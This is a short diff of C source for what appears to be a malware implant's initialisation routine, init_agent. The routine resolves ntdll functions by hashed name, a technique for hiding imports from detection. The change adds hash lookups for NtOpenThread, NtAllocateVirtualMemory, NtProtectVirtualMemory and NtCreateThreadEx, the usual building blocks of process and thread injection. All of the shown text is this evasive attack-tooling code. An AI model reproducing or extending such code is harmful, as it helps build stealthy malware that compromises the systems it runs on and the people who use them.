@@ -29,7 +29,7 @@ BYTE HashKeyBytes[] = HASH_KEY_BYTES;
 #endif
 
 UINT64 DllHashes[2] = { 0 };
-UINT64 ApiHashes[50] = { 0 };
+UINT64 ApiHashes[54] = { 0 };
 
 INT init_agent(PVOID RetAddress) {
 
@@ -185,6 +185,22 @@ INT init_agent(PVOID RetAddress) {
     
     agent->apis->pNtQueryVirtualMemory = (t_NtQueryVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[47]);
     if (!agent->apis->pNtQueryVirtualMemory)
+        return -1;
+
+    agent->apis->pNtOpenThread = (t_NtOpenThread)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[50]);
+    if (!agent->apis->pNtOpenThread)
+        return -1;
+
+    agent->apis->pNtAllocateVirtualMemory = (t_NtAllocateVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[51]);
+    if (!agent->apis->pNtAllocateVirtualMemory)
+        return -1;
+
+    agent->apis->pNtProtectVirtualMemory = (t_NtProtectVirtualMemory)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[52]);
+    if (!agent->apis->pNtProtectVirtualMemory)
+        return -1;
+
+    agent->apis->pNtCreateThreadEx = (t_NtCreateThreadEx)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[53]);
+    if (!agent->apis->pNtCreateThreadEx)
         return -1;
 
 
